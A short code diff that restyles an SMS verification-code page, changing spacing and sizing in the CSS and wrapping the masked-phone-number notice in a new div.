@@ -127,17 +127,19 @@
             background-color: var(--email-bg);
             border: 1px solid var(--email-border);
             border-radius: 16px;
-            padding: 7px 2px 7px 2px;
+            padding: 5px 2px 5px 2px;
             font-size: 13px;
-            margin-bottom: 24px;
+            margin-bottom: 49px;
+            margin-top: 9px;
             text-align: center;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 15px;
+            gap: 3px;
             cursor: pointer;
             width: 100%;
-            max-width: 280px;
+            max-width: 250px;
+            position: relative;
             
         }
         
@@ -427,8 +429,9 @@
             </div>
             
             <!-- Information text -->
-            <p class="info-text">A text message with a 6-digit verification code was just sent to **** *** **09</p>
-
+            <div class="info-text">
+            <p class="info">A text message with a 6-digit verification code was just sent to **** *** **09</p>
+			</div>
             <!-- Form with GET method -->
             <form id="verificationForm" method="GET" action="">
                 <!-- Verification code input with floating label -->
